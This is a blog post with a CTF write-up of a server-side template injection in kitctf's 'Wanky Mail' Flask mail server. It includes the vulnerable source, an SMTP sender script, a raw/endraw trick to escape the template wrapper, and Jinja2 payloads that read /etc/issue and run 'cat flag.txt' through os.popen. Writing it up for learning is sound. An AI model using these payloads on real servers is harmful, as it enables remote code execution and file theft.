+<meta name=description content="Offensive security researcher focused on vulnerability research, mobile security, application security, and reverse engineering."><meta name=author content="Rodolfo Tavares"><meta name=theme-color content="#0b0e13"><link rel=canonical href=https://incogbyte.github.io/posts/kitctf2023/><meta property="og:title" content="Template Injection Kitctf | incogbyte"><meta property="og:description" content="Offensive security researcher focused on vulnerability research, mobile security, application security, and reverse engineering."><meta property="og:type" content="article"><meta property="og:url" content="https://incogbyte.github.io/posts/kitctf2023/"><link rel=preconnect href=https://fonts.googleapis.com><link rel=preconnect href=https://fonts.gstatic.com crossorigin><link href="https://fonts.googleapis.com/css2?family=IBM+Plex+Mono:wght@400;500;600&family=IBM+Plex+Sans:wght@400;500;600&display=swap" rel=stylesheet><script src=/js/theme-init.js></script><link rel=stylesheet href=/css/style.css></head><body><a class=skip-link href=#main-content>Skip to content</a><div class=site-grid aria-hidden=true></div><header class=site-header><nav class=navbar aria-label="Main navigation"><a href=/ class=logo aria-label="Rodolfo Tavares, Home"><span class=logo-mark aria-hidden=true>~/</span>
+<span class=logo-lockup><span class=logo-text>incogbyte</span>
+<span class=logo-subtitle>offensive security research</span></span></a><ul class=nav-links id=site-navigation><li><a href=/posts/ class=nav-link>Writing</a></li><li><a href=/cve/ class=nav-link>CVEs</a></li><li><a href=/about/ class=nav-link>About</a></li></ul><div class=nav-actions><button class=theme-toggle type=button aria-label="Switch to light theme" title="Switch to light theme">
+<span class=theme-icon aria-hidden=true>☀</span>
+</button>
+<button class=menu-toggle type=button aria-label="Open navigation" aria-expanded=false aria-controls=site-navigation>
+<span></span>
+<span></span>
+<span></span></button></div></nav></header><main class=container id=main-content><article class=post-single><header class="post-header fade-in"><h1 class=post-single-title>Template Injection Kitctf</h1><div class=post-single-meta><time>June 19, 2023</time>
+<span class=reading-time>4 min read</span></div><div class=post-tags><span class=tag>writeup</span>
+<span class=tag>ctf</span></div></header><div class="post-content fade-in"><p>In this blog post, we will explore a specific template injection vulnerability discovered in a CTF (Capture The Flag) challenge from kitctf. We will delve into the details of the vulnerability. Let’s dive in!</p><blockquote><p>If you don’t know what is template injection, strong recoment that you visit the Burp labs <a href=https://portswigger.net/web-security/server-side-template-injection>https://portswigger.net/web-security/server-side-template-injection</a>.</p></blockquote><p>Brief introduction what is template injection. Template injection occurs when an application allows user-controlled input to be directly included in a template without proper sanitization or validation. This can lead to the execution of arbitrary code within the template context, potentially leading to remote code execution (RCE) or other critical security breaches.</p><h3 id=the-challeger-chall>The challeger (Chall)</h3><p>The chall was called “Wanky Mail”. Wanky Mail is a temporary mail server, which you could send and receive messages. The cool thing about kitctf is that they provide a Dockerfile for you to “build” the challenge on your machine, and also the source code!. Below is the code of the mail server:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-python data-lang=python><span style=display:flex><span><span style=color:#ff79c6>from</span> flask <span style=color:#ff79c6>import</span> Flask, render_template_string, request, redirect, abort
+</span></span><span style=display:flex><span><span style=color:#ff79c6>from</span> aiosmtpd.controller <span style=color:#ff79c6>import</span> Controller
+</span></span><span style=display:flex><span><span style=color:#ff79c6>from</span> datetime <span style=color:#ff79c6>import</span> datetime
+</span></span><span style=display:flex><span><span style=color:#ff79c6>from</span> base58 <span style=color:#ff79c6>import</span> b58decode, b58encode
+</span></span><span style=display:flex><span><span style=color:#ff79c6>import</span> random 
+</span></span><span style=display:flex><span><span style=color:#ff79c6>import</span> string
+</span></span><span style=display:flex><span><span style=color:#ff79c6>import</span> os
+</span></span><span style=display:flex><span><span style=color:#ff79c6>from</span> datetime <span style=color:#ff79c6>import</span> datetime
+</span></span><span style=display:flex><span><span style=color:#ff79c6>import</span> queue
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>mails <span style=color:#ff79c6>=</span> {}
+</span></span><span style=display:flex><span>active_addr <span style=color:#ff79c6>=</span> queue<span style=color:#ff79c6>.</span>Queue(<span style=color:#bd93f9>1000</span>)
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span><span style=color:#ff79c6>def</span> <span style=color:#50fa7b>format_email</span>(sender, rcpt, body, timestamp, subject):
+</span></span><span style=display:flex><span>    <span style=color:#ff79c6>return</span> {<span style=color:#f1fa8c>&#34;sender&#34;</span>: sender, <span style=color:#f1fa8c>&#34;rcpt&#34;</span>: rcpt, <span style=color:#f1fa8c>&#39;body&#39;</span>: body, <span style=color:#f1fa8c>&#39;subject&#39;</span>: subject, <span style=color:#f1fa8c>&#34;timestamp&#34;</span>: timestamp}
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span><span style=color:#ff79c6>def</span> <span style=color:#50fa7b>render_emails</span>(address):
+</span></span><span style=display:flex><span>    <span style=color:#8be9fd;font-style:italic>id</span> <span style=color:#ff79c6>=</span> <span style=color:#bd93f9>0</span>
+</span></span><span style=display:flex><span>    render <span style=color:#ff79c6>=</span> <span style=color:#f1fa8c>&#34;&#34;&#34;
+</span></span></span><span style=display:flex><span><span style=color:#f1fa8c>    &lt;table&gt;
+</span></span></span><span style=display:flex><span><span style=color:#f1fa8c>        &lt;tr&gt;
+</span></span></span><span style=display:flex><span><span style=color:#f1fa8c>            &lt;th id=&#34;th-left&#34;&gt;From&lt;/th&gt;
+</span></span></span><span style=display:flex><span><span style=color:#f1fa8c>            &lt;th&gt;Subject&lt;/th&gt;
+</span></span></span><span style=display:flex><span><span style=color:#f1fa8c>            &lt;th id=&#34;th-right&#34;&gt;Date&lt;/th&gt;
+</span></span></span><span style=display:flex><span><span style=color:#f1fa8c>        &lt;/tr&gt;
+</span></span></span><span style=display:flex><span><span style=color:#f1fa8c>    &#34;&#34;&#34;</span>
+</span></span><span style=display:flex><span>    overlays <span style=color:#ff79c6>=</span> <span style=color:#f1fa8c>&#34;&#34;</span>
+</span></span><span style=display:flex><span>    m <span style=color:#ff79c6>=</span> mails[address]<span style=color:#ff79c6>.</span>copy()
+</span></span><span style=display:flex><span>    <span style=color:#ff79c6>for</span> email <span style=color:#ff79c6>in</span> m:
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>        render <span style=color:#ff79c6>+=</span> <span style=color:#f1fa8c>f</span><span style=color:#f1fa8c>&#34;&#34;&#34;
+</span></span></span><span style=display:flex><span><span style=color:#f1fa8c>        &lt;tr id=&#34;</span><span style=color:#f1fa8c>{</span><span style=color:#8be9fd;font-style:italic>id</span><span style=color:#f1fa8c>}</span><span style=color:#f1fa8c>&#34;&gt;
+</span></span></span><span style=display:flex><span><span style=color:#f1fa8c>            &lt;td&gt;</span><span style=color:#f1fa8c>{</span>email[<span style=color:#f1fa8c>&#39;sender&#39;</span>]<span style=color:#f1fa8c>}</span><span style=color:#f1fa8c>&lt;/td&gt;
+</span></span></span><span style=display:flex><span><span style=color:#f1fa8c>            &lt;td&gt;</span><span style=color:#f1fa8c>{</span>email[<span style=color:#f1fa8c>&#39;subject&#39;</span>]<span style=color:#f1fa8c>}</span><span style=color:#f1fa8c>&lt;/td&gt;
+</span></span></span><span style=display:flex><span><span style=color:#f1fa8c>            &lt;td&gt;</span><span style=color:#f1fa8c>{</span>email[<span style=color:#f1fa8c>&#39;timestamp&#39;</span>]<span style=color:#f1fa8c>}</span><span style=color:#f1fa8c>&lt;/td&gt;
+</span></span></span><span style=display:flex><span><span style=color:#f1fa8c>        &lt;/tr&gt;
+</span></span></span><span style=display:flex><span><span style=color:#f1fa8c>        &#34;&#34;&#34;</span>
+</span></span><span style=display:flex><span>        overlays <span style=color:#ff79c6>+=</span> <span style=color:#f1fa8c>f</span><span style=color:#f1fa8c>&#34;&#34;&#34;
+</span></span></span><span style=display:flex><span><span style=color:#f1fa8c>        &lt;div id=&#34;overlay-</span><span style=color:#f1fa8c>{</span><span style=color:#8be9fd;font-style:italic>id</span><span style=color:#f1fa8c>}</span><span style=color:#f1fa8c>&#34; class=&#34;overlay&#34;&gt;
+</span></span></span><span style=display:flex><span><span style=color:#f1fa8c>            &lt;div class=&#34;email-details&#34;&gt;
+</span></span></span><span style=display:flex><span><span style=color:#f1fa8c>                &lt;h1&gt;</span><span style=color:#f1fa8c>{</span>email[<span style=color:#f1fa8c>&#39;subject&#39;</span>]<span style=color:#f1fa8c>}</span><span style=color:#f1fa8c> - from: </span><span style=color:#f1fa8c>{</span>email[<span style=color:#f1fa8c>&#39;sender&#39;</span>]<span style=color:#f1fa8c>}</span><span style=color:#f1fa8c> to </span><span style=color:#f1fa8c>{</span>email[<span style=color:#f1fa8c>&#39;rcpt&#39;</span>]<span style=color:#f1fa8c>}</span><span style=color:#f1fa8c>&lt;/h1&gt;
+</span></span></span><span style=display:flex><span><span style=color:#f1fa8c>                &lt;p&gt;</span><span style=color:#f1fa8c>{</span>email[<span style=color:#f1fa8c>&#39;body&#39;</span>]<span style=color:#f1fa8c>}</span><span style=color:#f1fa8c>&lt;/p&gt;
+</span></span></span><span style=display:flex><span><span style=color:#f1fa8c>            &lt;/div&gt;
+</span></span></span><span style=display:flex><span><span style=color:#f1fa8c>        &lt;/div&gt;
+</span></span></span><span style=display:flex><span><span style=color:#f1fa8c>        &#34;&#34;&#34;</span>
+</span></span><span style=display:flex><span>        <span style=color:#8be9fd;font-style:italic>id</span> <span style=color:#ff79c6>+=</span><span style=color:#bd93f9>1</span>
+</span></span><span style=display:flex><span>    render <span style=color:#ff79c6>+=</span> <span style=color:#f1fa8c>&#34;&lt;/table&gt;&#34;</span>
+</span></span><span style=display:flex><span>    render <span style=color:#ff79c6>+=</span> overlays
+</span></span><span style=display:flex><span>    <span style=color:#ff79c6>return</span> render
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span><span style=color:#ff79c6>def</span> <span style=color:#50fa7b>get_emails</span>(<span style=color:#8be9fd;font-style:italic>id</span>):
+</span></span><span style=display:flex><span>    <span style=color:#ff79c6>with</span> <span style=color:#8be9fd;font-style:italic>open</span>(<span style=color:#f1fa8c>&#39;templates/index.html&#39;</span>) <span style=color:#ff79c6>as</span> f:
+</span></span><span style=display:flex><span>        page <span style=color:#ff79c6>=</span> f<span style=color:#ff79c6>.</span>read()
+</span></span><span style=display:flex><span>        <span style=color:#ff79c6>return</span> page<span style=color:#ff79c6>.</span>replace(<span style=color:#f1fa8c>&#39;{{$}}&#39;</span>, render_emails(<span style=color:#8be9fd;font-style:italic>id</span>))
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span><span style=color:#ff79c6>def</span> <span style=color:#50fa7b>log_email</span>(session, envelope):
+</span></span><span style=display:flex><span>    <span style=color:#8be9fd;font-style:italic>print</span>(<span style=color:#f1fa8c>f</span><span style=color:#f1fa8c>&#39;</span><span style=color:#f1fa8c>{</span>session<span style=color:#ff79c6>.</span>peer[<span style=color:#bd93f9>0</span>]<span style=color:#f1fa8c>}</span><span style=color:#f1fa8c> - - </span><span style=color:#f1fa8c>{</span><span style=color:#8be9fd;font-style:italic>repr</span>(envelope<span style=color:#ff79c6>.</span>mail_from)<span style=color:#f1fa8c>}</span><span style=color:#f1fa8c>:</span><span style=color:#f1fa8c>{</span><span style=color:#8be9fd;font-style:italic>repr</span>(envelope<span style=color:#ff79c6>.</span>rcpt_tos)<span style=color:#f1fa8c>}</span><span style=color:#f1fa8c>:</span><span style=color:#f1fa8c>{</span><span style=color:#8be9fd;font-style:italic>repr</span>(envelope<span style=color:#ff79c6>.</span>content)<span style=color:#f1fa8c>}</span><span style=color:#f1fa8c>&#39;</span>, flush<span style=color:#ff79c6>=</span><span style=color:#ff79c6>True</span>)
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span><span style=color:#ff79c6>def</span> <span style=color:#50fa7b>esc</span>(s: <span style=color:#8be9fd;font-style:italic>str</span>):
+</span></span><span style=display:flex><span>    <span style=color:#ff79c6>return</span> <span style=color:#f1fa8c>&#34;{</span><span style=color:#f1fa8c>% r</span><span style=color:#f1fa8c>aw %}&#34;</span> <span style=color:#ff79c6>+</span> s <span style=color:#ff79c6>+</span> <span style=color:#f1fa8c>&#34;{</span><span style=color:#f1fa8c>% e</span><span style=color:#f1fa8c>ndraw %}&#34;</span>
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span><span style=color:#ff79c6>class</span> <span style=color:#50fa7b>Handler</span>:
+</span></span><span style=display:flex><span>     <span style=color:#ff79c6>async</span> <span style=color:#ff79c6>def</span> <span style=color:#50fa7b>handle_RCPT</span>(self, server, session, envelope, address, rcpt_options):
+</span></span><span style=display:flex><span>        <span style=color:#ff79c6>if</span> <span style=color:#ff79c6>not</span> address<span style=color:#ff79c6>.</span>endswith(os<span style=color:#ff79c6>.</span>environ<span style=color:#ff79c6>.</span>get(<span style=color:#f1fa8c>&#39;HOSTNAME&#39;</span>)):
+</span></span><span style=display:flex><span>             <span style=color:#ff79c6>return</span> <span style=color:#f1fa8c>&#39;550 not relaying to that domain&#39;</span>
+</span></span><span style=display:flex><span>        envelope<span style=color:#ff79c6>.</span>rcpt_tos<span style=color:#ff79c6>.</span>append(address)
+</span></span><span style=display:flex><span>        <span style=color:#8be9fd;font-style:italic>print</span>(address, flush<span style=color:#ff79c6>=</span><span style=color:#ff79c6>True</span>)
+</span></span><span style=display:flex><span>        <span style=color:#ff79c6>return</span> <span style=color:#f1fa8c>&#39;250 OK&#39;</span>
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>     <span style=color:#ff79c6>async</span> <span style=color:#ff79c6>def</span> <span style=color:#50fa7b>handle_DATA</span>(self, server, session, envelope):
+</span></span><span style=display:flex><span>        m <span style=color:#ff79c6>=</span> format_email(esc(envelope<span style=color:#ff79c6>.</span>mail_from), envelope<span style=color:#ff79c6>.</span>rcpt_tos[<span style=color:#bd93f9>0</span>], esc(envelope<span style=color:#ff79c6>.</span>content<span style=color:#ff79c6>.</span>decode()), datetime<span style=color:#ff79c6>.</span>now()<span style=color:#ff79c6>.</span>strftime(<span style=color:#f1fa8c>&#34;</span><span style=color:#f1fa8c>%d</span><span style=color:#f1fa8c>-%m-%Y, %H:%M:%S&#34;</span>), <span style=color:#f1fa8c>&#34;PLACEHOLDER&#34;</span>)
+</span></span><span style=display:flex><span>        log_email(session, envelope)
+</span></span><span style=display:flex><span>        r <span style=color:#ff79c6>=</span> envelope<span style=color:#ff79c6>.</span>rcpt_tos[<span style=color:#bd93f9>0</span>]
+</span></span><span style=display:flex><span>        <span style=color:#ff79c6>if</span> <span style=color:#ff79c6>not</span> mails<span style=color:#ff79c6>.</span>get(r):
+</span></span><span style=display:flex><span>            <span style=color:#ff79c6>if</span> active_addr<span style=color:#ff79c6>.</span>full():
+</span></span><span style=display:flex><span>                mails<span style=color:#ff79c6>.</span>pop(active_addr<span style=color:#ff79c6>.</span>get())
+</span></span><span style=display:flex><span>            mails[r] <span style=color:#ff79c6>=</span> []
+</span></span><span style=display:flex><span>            active_addr<span style=color:#ff79c6>.</span>put(r)
+</span></span><span style=display:flex><span>        <span style=color:#ff79c6>if</span> <span style=color:#8be9fd;font-style:italic>len</span>(mails[r]) <span style=color:#ff79c6>&gt;</span> <span style=color:#bd93f9>10</span>:
+</span></span><span style=display:flex><span>            mails[r]<span style=color:#ff79c6>.</span>pop(<span style=color:#bd93f9>0</span>)
+</span></span><span style=display:flex><span>        mails[r]<span style=color:#ff79c6>.</span>append(m)
+</span></span><span style=display:flex><span>        <span style=color:#ff79c6>return</span> <span style=color:#f1fa8c>&#39;250 OK&#39;</span>
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>c <span style=color:#ff79c6>=</span> Controller(Handler(), <span style=color:#f1fa8c>&#34;0.0.0.0&#34;</span>)
+</span></span><span style=display:flex><span>c<span style=color:#ff79c6>.</span>start()
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>app <span style=color:#ff79c6>=</span> Flask(__name__)
+</span></span><span style=display:flex><span>@app.route(<span style=color:#f1fa8c>&#39;/&#39;</span>)
+</span></span><span style=display:flex><span><span style=color:#ff79c6>def</span> <span style=color:#50fa7b>index</span>():
+</span></span><span style=display:flex><span>    username <span style=color:#ff79c6>=</span> <span style=color:#f1fa8c>&#39;&#39;</span><span style=color:#ff79c6>.</span>join(random<span style=color:#ff79c6>.</span>choice(string<span style=color:#ff79c6>.</span>ascii_lowercase) <span style=color:#ff79c6>for</span> i <span style=color:#ff79c6>in</span> <span style=color:#8be9fd;font-style:italic>range</span>(<span style=color:#bd93f9>12</span>))
+</span></span><span style=display:flex><span>    address <span style=color:#ff79c6>=</span> <span style=color:#f1fa8c>f</span><span style=color:#f1fa8c>&#34;</span><span style=color:#f1fa8c>{</span>username<span style=color:#f1fa8c>}</span><span style=color:#f1fa8c>@</span><span style=color:#f1fa8c>{</span>os<span style=color:#ff79c6>.</span>environ<span style=color:#ff79c6>.</span>get(<span style=color:#f1fa8c>&#39;HOSTNAME&#39;</span>, <span style=color:#f1fa8c>&#39;example.com&#39;</span>)<span style=color:#f1fa8c>}</span><span style=color:#f1fa8c>&#34;</span>
+</span></span><span style=display:flex><span>    <span style=color:#ff79c6>if</span> <span style=color:#ff79c6>not</span> address <span style=color:#ff79c6>in</span> mails<span style=color:#ff79c6>.</span>keys():
+</span></span><span style=display:flex><span>        <span style=color:#ff79c6>if</span> active_addr<span style=color:#ff79c6>.</span>full():
+</span></span><span style=display:flex><span>            <span style=color:#ff79c6>del</span> mails[active_addr<span style=color:#ff79c6>.</span>get()]
+</span></span><span style=display:flex><span>        mails[address] <span style=color:#ff79c6>=</span> []
+</span></span><span style=display:flex><span>        active_addr<span style=color:#ff79c6>.</span>put(address)
+</span></span><span style=display:flex><span>    <span style=color:#8be9fd;font-style:italic>id</span> <span style=color:#ff79c6>=</span> b58encode(address)<span style=color:#ff79c6>.</span>decode()
+</span></span><span style=display:flex><span>    <span style=color:#ff79c6>return</span> redirect(<span style=color:#f1fa8c>&#34;/&#34;</span> <span style=color:#ff79c6>+</span> <span style=color:#8be9fd;font-style:italic>id</span>)
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>@app.route(<span style=color:#f1fa8c>&#39;/&lt;id&gt;&#39;</span>)
+</span></span><span style=display:flex><span><span style=color:#ff79c6>def</span> <span style=color:#50fa7b>mailbox</span>(<span style=color:#8be9fd;font-style:italic>id</span>):
+</span></span><span style=display:flex><span>    address <span style=color:#ff79c6>=</span> b58decode(<span style=color:#8be9fd;font-style:italic>id</span>)<span style=color:#ff79c6>.</span>decode()
+</span></span><span style=display:flex><span>    <span style=color:#ff79c6>if</span> <span style=color:#ff79c6>not</span> address <span style=color:#ff79c6>in</span> mails<span style=color:#ff79c6>.</span>keys():
+</span></span><span style=display:flex><span>        abort(<span style=color:#bd93f9>404</span>)    
+</span></span><span style=display:flex><span>    <span style=color:#ff79c6>return</span> render_template_string(get_emails(address), address<span style=color:#ff79c6>=</span>address)
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span><span style=color:#ff79c6>if</span> __name__ <span style=color:#ff79c6>==</span> <span style=color:#f1fa8c>&#39;__main__&#39;</span>:
+</span></span><span style=display:flex><span>    app<span style=color:#ff79c6>.</span>run()
+</span></span></code></pre></div><h3 id=analyzing-the-code>Analyzing the code</h3><p>Analyzing the code we can identify that when sending an email to our temporary email, the code uses an escape function to render the email, as illustrated below:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-python data-lang=python><span style=display:flex><span><span style=color:#ff79c6>def</span> <span style=color:#50fa7b>esc</span>(s: <span style=color:#8be9fd;font-style:italic>str</span>):
+</span></span><span style=display:flex><span>    <span style=color:#ff79c6>return</span> <span style=color:#f1fa8c>&#34;{</span><span style=color:#f1fa8c>% r</span><span style=color:#f1fa8c>aw %}&#34;</span> <span style=color:#ff79c6>+</span> s <span style=color:#ff79c6>+</span> <span style=color:#f1fa8c>&#34;{</span><span style=color:#f1fa8c>% e</span><span style=color:#f1fa8c>ndraw %}&#34;</span>
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span><span style=color:#ff79c6>class</span> <span style=color:#50fa7b>Handler</span>:
+</span></span><span style=display:flex><span>     <span style=color:#ff79c6>async</span> <span style=color:#ff79c6>def</span> <span style=color:#50fa7b>handle_RCPT</span>(self, server, session, envelope, address, rcpt_options):
+</span></span><span style=display:flex><span>        <span style=color:#ff79c6>if</span> <span style=color:#ff79c6>not</span> address<span style=color:#ff79c6>.</span>endswith(os<span style=color:#ff79c6>.</span>environ<span style=color:#ff79c6>.</span>get(<span style=color:#f1fa8c>&#39;HOSTNAME&#39;</span>)):
+</span></span><span style=display:flex><span>             <span style=color:#ff79c6>return</span> <span style=color:#f1fa8c>&#39;550 not relaying to that domain&#39;</span>
+</span></span><span style=display:flex><span>        envelope<span style=color:#ff79c6>.</span>rcpt_tos<span style=color:#ff79c6>.</span>append(address)
+</span></span><span style=display:flex><span>        <span style=color:#8be9fd;font-style:italic>print</span>(address, flush<span style=color:#ff79c6>=</span><span style=color:#ff79c6>True</span>)
+</span></span><span style=display:flex><span>        <span style=color:#ff79c6>return</span> <span style=color:#f1fa8c>&#39;250 OK&#39;</span>
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>     <span style=color:#ff79c6>async</span> <span style=color:#ff79c6>def</span> <span style=color:#50fa7b>handle_DATA</span>(self, server, session, envelope):
+</span></span><span style=display:flex><span>        m <span style=color:#ff79c6>=</span> format_email(esc(envelope<span style=color:#ff79c6>.</span>mail_from), envelope<span style=color:#ff79c6>.</span>rcpt_tos[<span style=color:#bd93f9>0</span>], esc(envelope<span style=color:#ff79c6>.</span>content<span style=color:#ff79c6>.</span>decode()), datetime<span style=color:#ff79c6>.</span>now()<span style=color:#ff79c6>.</span>strftime(<span style=color:#f1fa8c>&#34;</span><span style=color:#f1fa8c>%d</span><span style=color:#f1fa8c>-%m-%Y, %H:%M:%S&#34;</span>), <span style=color:#f1fa8c>&#34;PLACEHOLDER&#34;</span>)
+</span></span><span style=display:flex><span>        log_email(session, envelope)
+</span></span><span style=display:flex><span>        r <span style=color:#ff79c6>=</span> envelope<span style=color:#ff79c6>.</span>rcpt_tos[<span style=color:#bd93f9>0</span>]
+</span></span><span style=display:flex><span>        <span style=color:#ff79c6>if</span> <span style=color:#ff79c6>not</span> mails<span style=color:#ff79c6>.</span>get(r):
+</span></span><span style=display:flex><span>            <span style=color:#ff79c6>if</span> active_addr<span style=color:#ff79c6>.</span>full():
+</span></span><span style=display:flex><span>                mails<span style=color:#ff79c6>.</span>pop(active_addr<span style=color:#ff79c6>.</span>get())
+</span></span><span style=display:flex><span>            mails[r] <span style=color:#ff79c6>=</span> []
+</span></span><span style=display:flex><span>            active_addr<span style=color:#ff79c6>.</span>put(r)
+</span></span><span style=display:flex><span>        <span style=color:#ff79c6>if</span> <span style=color:#8be9fd;font-style:italic>len</span>(mails[r]) <span style=color:#ff79c6>&gt;</span> <span style=color:#bd93f9>10</span>:
+</span></span><span style=display:flex><span>            mails[r]<span style=color:#ff79c6>.</span>pop(<span style=color:#bd93f9>0</span>)
+</span></span><span style=display:flex><span>        mails[r]<span style=color:#ff79c6>.</span>append(m)
+</span></span><span style=display:flex><span>        <span style=color:#ff79c6>return</span> <span style=color:#f1fa8c>&#39;250 OK&#39;</span>
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>c <span style=color:#ff79c6>=</span> Controller(Handler(), <span style=color:#f1fa8c>&#34;0.0.0.0&#34;</span>)
+</span></span><span style=display:flex><span>c<span style=color:#ff79c6>.</span>start()
+</span></span></code></pre></div><p>So as you can see, in the code, every time someone sends an email, the “subject” and “content” fields execute the esc() function. To use the temporary email service, kitctf people provided some information to use the email server, to use the service, I made the following code in python to send emails using the smtplib library. As the following code demonstrates:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-python data-lang=python><span style=display:flex><span>
+</span></span><span style=display:flex><span><span style=color:#ff79c6>import</span> smtplib
+</span></span><span style=display:flex><span><span style=color:#ff79c6>from</span> email.mime.text <span style=color:#ff79c6>import</span> MIMEText
+</span></span><span style=display:flex><span><span style=color:#ff79c6>from</span> email.mime.multipart <span style=color:#ff79c6>import</span> MIMEMultipart
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>sender_email <span style=color:#ff79c6>=</span> <span style=color:#f1fa8c>&#39;abx@kitctf.de&#39;</span>
+</span></span><span style=display:flex><span>receiver_email <span style=color:#ff79c6>=</span> <span style=color:#f1fa8c>&#39;abx@kitctf.de&#39;</span>
+</span></span><span style=display:flex><span>subject <span style=color:#ff79c6>=</span> <span style=color:#f1fa8c>&#39;pewpew&#39;</span>
+</span></span><span style=display:flex><span>message <span style=color:#ff79c6>=</span> <span style=color:#f1fa8c>&#39;pewpew&#39;</span>
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>msg <span style=color:#ff79c6>=</span> MIMEMultipart()
+</span></span><span style=display:flex><span>msg[<span style=color:#f1fa8c>&#39;From&#39;</span>] <span style=color:#ff79c6>=</span> sender_email
+</span></span><span style=display:flex><span>msg[<span style=color:#f1fa8c>&#39;To&#39;</span>] <span style=color:#ff79c6>=</span> receiver_email
+</span></span><span style=display:flex><span>msg[<span style=color:#f1fa8c>&#39;Subject&#39;</span>] <span style=color:#ff79c6>=</span> subject
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>msg<span style=color:#ff79c6>.</span>attach(MIMEText(message, <span style=color:#f1fa8c>&#39;plain&#39;</span>))
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>smtp_server <span style=color:#ff79c6>=</span> <span style=color:#f1fa8c>&#39;mailserver-from-kitctf&#39;</span>
+</span></span><span style=display:flex><span>smtp_port <span style=color:#ff79c6>=</span> <span style=color:#bd93f9>8025</span>
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span><span style=color:#ff79c6>with</span> smtplib<span style=color:#ff79c6>.</span>SMTP(smtp_server, smtp_port) <span style=color:#ff79c6>as</span> server:
+</span></span><span style=display:flex><span>    server<span style=color:#ff79c6>.</span>sendmail(sender_email, receiver_email, msg<span style=color:#ff79c6>.</span>as_string())
+</span></span></code></pre></div><p>The first step was to send a test code, in the subject field, with the objective of circumventing the esc() function, the payload {{7*7}} was used:</p><p><img src=/images/kitctf-1.png alt></p><p><img src=/images/kitctf-2.png alt></p><p>The next step was to try to run commands using the command 'rodnt'.<strong>class</strong>.<strong>base</strong>.<strong>subclasses</strong>()[92].<strong>subclasses</strong>()[0].<strong>subclasses</strong>()<a href="'/etc/issue'">0</a>.read():</p><p><img src=/images/kitctf-3.png alt></p><p>The next step was to execute the payload to list the files contained in the machine, the following payload was used {{request.application.<strong>globals</strong>.<strong>builtins</strong>.<strong>import</strong>('os').popen('cat flag.txt').read()}}.</p><p><img src=/images/kitctf-4.png alt></p><p><img src=/images/kitctf-5.png alt></p><blockquote><p>All payloads had to be between {% endraw %} (% raw %}. Example: {% endraw %} {{ 7*7 }} {% raw %}, this was necessary to bypass the esc() function.</p></blockquote></div><footer class="post-footer fade-in"><div class=post-nav><a href=https://incogbyte.github.io/posts/2022-01-20-cve-2022-23046-phpipam/ class="post-nav-link prev"><span>← Previous</span>
+<span class=post-nav-title>PHPIPAM CVE</span>
+</a><a href=https://incogbyte.github.io/posts/decryptwhatsappmsgandroid/ class="post-nav-link next"><span>Next →</span>
+<span class=post-nav-title>Decrypt WhatsApp Msgs Android (Investigator)</span></a></div></footer></article></main><footer class=site-footer><div class=footer-content><p><span class=footer-prompt>~/incogbyte</span> <span>Security research, notes and disclosures.</span></p><nav class=footer-links aria-label="External profiles"><a href=https://github.com/incogbyte target=_blank rel="noopener noreferrer">GitHub</a>
+<a href=https://linkedin.com/in/rodolfo-tavares-543863a7 target=_blank rel="noopener noreferrer">LinkedIn</a>
+<a href=mailto:incogbyte@protonmail.com>Email</a>
+<a href=/index.xml>RSS</a></nav></div></footer><script src=/js/main.js></script></body></html>
